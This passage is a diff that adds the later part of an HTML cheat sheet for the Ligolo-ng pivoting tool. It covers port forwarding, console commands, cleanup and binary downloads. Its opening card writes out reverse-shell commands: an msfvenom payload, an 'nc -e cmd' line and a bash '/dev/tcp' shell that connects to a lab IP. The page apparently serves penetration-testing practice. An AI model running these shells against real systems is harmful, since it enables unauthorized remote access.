+        <div class="step-label">Step 2 — Start netcat on Kali</div>
+        <div class="cmd-block">
+<code><span class="kw">nc -lvnp</span> <span class="port">443</span></code>
+        </div>
+        <div class="step-label">Step 3 — Generate payload pointing to AGENT's IP (not Kali!)</div>
+        <div class="cmd-block">
+<code><span class="kw">msfvenom</span> <span class="flag">-p</span> windows/x64/shell_reverse_tcp \
+  <span class="var">LHOST</span>=<span class="ip">10.10.10.10</span> <span class="var">LPORT</span>=<span class="port">8888</span> \
+  <span class="flag">-f</span> exe <span class="flag">-o</span> <span class="path">rev.exe</span>
+<span class="comment"># LHOST = internal IP of agent (TARGET #1)</span>
+<span class="comment"># LPORT = listener port on agent (:8888)</span></code>
+        </div>
+        <div class="step-label">Step 4 — Execute on TARGET #2</div>
+        <div class="cmd-block">
+<code>.\<span class="path">rev.exe</span>
+<span class="comment"># Shell arrives on Kali nc :443 via Ligolo forward</span></code>
+        </div>
+        <div class="step-label">Simple netcat reverse shell alternative</div>
+        <div class="cmd-block">
+<code><span class="kw">nc64.exe</span> <span class="ip">10.10.10.10</span> <span class="port">443</span> <span class="flag">-e</span> cmd
+<span class="comment"># Or using bash on Linux:</span>
+<span class="kw">bash</span> <span class="flag">-i</span> &gt;&amp; /dev/tcp/<span class="ip">10.10.10.10</span>/<span class="port">443</span> 0&gt;&amp;1</code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Local Port Forwarding / Jumpbox -->
+    <div class="card card-accent-amber">
+      <div class="card-header">
+        <span class="card-num">10</span>
+        <span class="card-icon">🏠</span>
+        <span class="card-title card-title-amber">Access Jumpbox Local Ports</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="note note-blue" style="margin-bottom:12px;">
+          <span class="note-icon">💡</span>
+          <span>Found a web app / service running only on the agent's loopback (127.0.0.1)? Use <strong>240.0.0.1</strong> — Ligolo's magic IP for agent localhost.</span>
+        </div>
+        <div class="step-label">Add the magic route</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip route add</span> <span class="ip">240.0.0.1/32</span> dev <span class="path">ligolo</span></code>
+        </div>
+        <div class="step-label">Scan all local ports on the agent</div>
+        <div class="cmd-block">
+<code><span class="kw">nmap -p-</span> <span class="ip">240.0.0.1</span>
+<span class="comment"># Shows ports open on agent's 127.0.0.1</span>
+<span class="comment"># No proxychains needed — works with Firefox too!</span></code>
+        </div>
+        <div class="step-label">Browse a local web app on the agent</div>
+        <div class="cmd-block">
+<code><span class="comment"># In Firefox / curl — point to:</span>
+<span class="kw">curl</span> <span class="ip">http://240.0.0.1</span>:<span class="port">8080</span>
+<span class="comment"># Or open in Firefox: http://240.0.0.1:8080</span></code>
+        </div>
+        <div class="step-label">SSH directly into agent's local service</div>
+        <div class="cmd-block">
+<code><span class="kw">ssh</span> user@<span class="ip">240.0.0.1</span> <span class="flag">-p</span> <span class="port">22</span></code>
+        </div>
+        <div class="note note-green">
+          <span class="note-icon">✅</span>
+          <span>Works in any tool — nmap, curl, ssh, Firefox, impacket — without any proxy configuration.</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- SECTION: NEW v0.6+ INTERFACE COMMANDS -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>05 — Modern API (v0.6+) — Built-in Interface Commands</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="grid">
+
+    <div class="card card-accent-purple">
+      <div class="card-header">
+        <span class="card-num">11</span>
+        <span class="card-icon">🆕</span>
+        <span class="card-title card-title-purple">Interface Management (v0.6+)</span>
+        <span class="card-tag tag-session">PROXY CONSOLE</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Create interface (replaces ip tuntap command)</div>
+        <div class="cmd-block">
+<code>[Agent] » <span class="kw">ifcreate</span> <span class="flag">--name</span> <span class="path">ligolo0</span>
+[Agent] » <span class="kw">iflist</span>   <span class="comment"># verify interface created</span></code>
+        </div>
+        <div class="step-label">Start tunnel on named interface</div>
+        <div class="cmd-block">
+<code>[Agent] » <span class="kw">tunnel_start</span> <span class="flag">--name</span> <span class="path">ligolo0</span></code>
+        </div>
+        <div class="step-label">Add route (replaces ip route add)</div>
+        <div class="cmd-block">
+<code>[Agent] » <span class="kw">add_route</span> <span class="flag">--name</span> <span class="path">ligolo0</span> \
+                   <span class="flag">--route</span> <span class="ip">172.16.5.0/24</span>
+[Agent] » <span class="kw">route_list</span>  <span class="comment"># verify</span></code>
+        </div>
+        <div class="step-label">Delete interface</div>
+        <div class="cmd-block">
+<code>[Agent] » <span class="kw">interface_delete</span> <span class="flag">--name</span> <span class="path">ligolo0</span></code>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card: Quick Reference Commands -->
+    <div class="card card-accent-blue">
+      <div class="card-header">
+        <span class="card-num">12</span>
+        <span class="card-icon">⌨️</span>
+        <span class="card-title card-title-blue">All Proxy Console Commands</span>
+        <span class="card-tag tag-session">PROXY CONSOLE</span>
+      </div>
+      <div class="card-body">
+        <table class="qref-table">
+          <thead>
+            <tr><th>Command</th><th>Description</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>session</td><td>List &amp; select agent sessions</td></tr>
+            <tr><td>start [--tun name]</td><td>Start tunnel on current session</td></tr>
+            <tr><td>stop</td><td>Stop active tunnel</td></tr>
+            <tr><td>ifconfig</td><td>Show agent network interfaces</td></tr>
+            <tr><td>listener_add --addr --to --tcp</td><td>Add port forward listener</td></tr>
+            <tr><td>listener_list</td><td>Show active listeners</td></tr>
+            <tr><td>listener_stop &lt;id&gt;</td><td>Remove listener by ID</td></tr>
+            <tr><td>ifcreate --name</td><td>Create new TUN interface (v0.6+)</td></tr>
+            <tr><td>tunnel_start --name</td><td>Start tunnel on named iface (v0.6+)</td></tr>
+            <tr><td>add_route --name --route</td><td>Add route to interface (v0.6+)</td></tr>
+            <tr><td>route_list</td><td>Show all active routes (v0.6+)</td></tr>
+            <tr><td>certificate_fingerprint</td><td>Show TLS cert fingerprint</td></tr>
+            <tr><td>help</td><td>Show all available commands</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Card: Cleanup -->
+    <div class="card card-accent-red">
+      <div class="card-header">
+        <span class="card-num">13</span>
+        <span class="card-icon">🧹</span>
+        <span class="card-title card-title-red">Cleanup (Kali)</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Remove routes</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip route del</span> <span class="ip">10.10.10.0/24</span> dev <span class="path">ligolo</span>
+<span class="kw">sudo ip route del</span> <span class="ip">240.0.0.1/32</span> dev <span class="path">ligolo</span>
+<span class="comment"># Verify:</span>
+<span class="kw">ip route</span></code>
+        </div>
+        <div class="step-label">Bring down &amp; delete TUN interface</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip link set</span> <span class="path">ligolo</span> down
+<span class="kw">sudo ip link del</span> <span class="path">ligolo</span>
+<span class="comment"># Or in proxy console (v0.6+):</span>
+[Agent] » <span class="kw">interface_delete</span> <span class="flag">--name</span> <span class="path">ligolo</span></code>
+        </div>
+        <div class="step-label">Remove tunnel2 as well</div>
+        <div class="cmd-block">
+<code><span class="kw">sudo ip route del</span> <span class="ip">11.11.11.0/24</span> dev <span class="path">tunnel2</span>
+<span class="kw">sudo ip link del</span> <span class="path">tunnel2</span></code>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /grid -->
+
+  <!-- SECTION: QUICK COMPARISON -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>06 — Why Ligolo-ng vs. Others</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="card" style="margin-bottom:16px;">
+    <div class="card-body" style="padding: 0;">
+      <table class="qref-table">
+        <thead>
+          <tr>
+            <th>Feature</th>
+            <th>Ligolo-ng ✅</th>
+            <th>Chisel</th>
+            <th>SSHuttle</th>
+            <th>Proxychains+SSH</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Requires proxychains</td>
+            <td style="color:var(--accent3)">❌ No</td>
+            <td style="color:var(--accent5)">✅ Yes</td>
+            <td style="color:var(--accent3)">❌ No</td>
+            <td style="color:var(--accent5)">✅ Yes</td>
+          </tr>
+          <tr>
+            <td>ICMP / ping support</td>
+            <td style="color:var(--accent3)">✅ Yes</td>
+            <td style="color:var(--accent5)">❌ No</td>
+            <td style="color:var(--accent3)">✅ Yes</td>
+            <td style="color:var(--accent5)">❌ No</td>
+          </tr>
+          <tr>
+            <td>UDP support</td>
+            <td style="color:var(--accent3)">✅ Yes</td>
+            <td style="color:var(--accent5)">❌ No</td>
+            <td style="color:var(--text3)">Limited</td>
+            <td style="color:var(--accent5)">❌ No</td>
+          </tr>
+          <tr>
+            <td>Requires SSH on target</td>
+            <td style="color:var(--accent3)">❌ No</td>
+            <td style="color:var(--accent3)">❌ No</td>
+            <td style="color:var(--accent5)">✅ Yes</td>
+            <td style="color:var(--accent5)">✅ Yes</td>
+          </tr>
+          <tr>
+            <td>Needs admin/root on target</td>
+            <td style="color:var(--accent3)">❌ No</td>
+            <td style="color:var(--accent3)">❌ No</td>
+            <td style="color:var(--accent5)">✅ Yes</td>
+            <td style="color:var(--accent3)">❌ No</td>
+          </tr>
+          <tr>
+            <td>Speed</td>
+            <td style="color:var(--accent3)">100+ Mbps</td>
+            <td style="color:var(--text3)">Moderate</td>
+            <td style="color:var(--accent3)">Fast</td>
+            <td style="color:var(--text3)">Slow</td>
+          </tr>
+          <tr>
+            <td>Nmap SYN scan support</td>
+            <td style="color:var(--accent4)">--unprivileged</td>
+            <td style="color:var(--accent5)">❌ -sT only</td>
+            <td style="color:var(--accent3)">✅ Yes</td>
+            <td style="color:var(--accent5)">❌ -sT only</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- SECTION: DOWNLOAD -->
+  <div class="section-hdr">
+    <div class="section-hdr-line"></div>
+    <h2>07 — Download &amp; Agent Fingerprint Auth</h2>
+    <div class="section-hdr-line"></div>
+  </div>
+
+  <div class="grid grid-2">
+
+    <div class="card card-accent-blue">
+      <div class="card-header">
+        <span class="card-num">14</span>
+        <span class="card-icon">📦</span>
+        <span class="card-title card-title-blue">Download Binaries</span>
+        <span class="card-tag tag-kali">KALI</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Download proxy + agent (Linux amd64)</div>
+        <div class="cmd-block">
+<code><span class="kw">wget</span> https://github.com/nicocha30/ligolo-ng/releases/download/\
+  v0.6.2/<span class="path">ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz</span>
+<span class="kw">wget</span> https://github.com/nicocha30/ligolo-ng/releases/download/\
+  v0.6.2/<span class="path">ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz</span>
+<span class="kw">tar -xvf</span> <span class="path">ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz</span>
+<span class="kw">tar -xvf</span> <span class="path">ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz</span></code>
+        </div>
+        <div class="step-label">Download Windows agent</div>
+        <div class="cmd-block">
+<code><span class="kw">wget</span> https://github.com/nicocha30/ligolo-ng/releases/download/\
+  v0.6.2/<span class="path">ligolo-ng_agent_0.6.2_Windows_64bit.zip</span>
+<span class="kw">unzip</span> <span class="path">ligolo-ng_agent_0.6.2_Windows_64bit.zip</span></code>
+        </div>
+        <div class="note note-blue">
+          <span class="note-icon">🔗</span>
+          <span>Latest releases: <strong>github.com/nicocha30/ligolo-ng/releases</strong> — Recommended stable: <strong>v0.6.2</strong></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card card-accent-green">
+      <div class="card-header">
+        <span class="card-num">15</span>
+        <span class="card-icon">🔐</span>
+        <span class="card-title card-title-green">Fingerprint Auth (More Secure)</span>
+        <span class="card-tag tag-both">BOTH</span>
+      </div>
+      <div class="card-body">
+        <div class="step-label">Get cert fingerprint from proxy console</div>
+        <div class="cmd-block">
+<code>ligolo-ng » <span class="kw">certificate_fingerprint</span>
+<span class="comment"># Outputs SHA-256 hash of the self-signed cert</span></code>
+        </div>
+        <div class="step-label">Agent — connect using fingerprint (no -ignore-cert)</div>
+        <div class="cmd-block">
+<code><span class="comment"># Linux</span>
+./<span class="path">agent</span> <span class="flag">-accept-fingerprint</span> <span class="var">SHA256_HASH</span> \
+        <span class="flag">-connect</span> <span class="ip">192.168.45.176</span>:<span class="port">11601</span>
+
+<span class="comment"># Windows (background)</span>
+Start-Job <span class="flag">-ScriptBlock</span> { &amp; .\<span class="path">agent.exe</span> \
+  <span class="flag">-accept-fingerprint</span> <span class="var">SHA256_HASH</span> \
+  <span class="flag">-connect</span> <span class="ip">192.168.45.176</span>:<span class="port">11601</span> }</code>
+        </div>
+        <div class="note note-green">
+          <span class="note-icon">✅</span>
+          <span>Safer than <span class="hl">-ignore-cert</span> — prevents MitM attacks in real engagements.</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <footer>
+    <p><span class="pulse"></span>Ligolo-ng Cheat Sheet — github.com/nicocha30/ligolo-ng</p>
+    <p>TCP · UDP · ICMP · No SOCKS · No Proxychains · 100+ Mbps</p>
+  </footer>
+
+</div><!-- /page -->
+</body>
+</html>
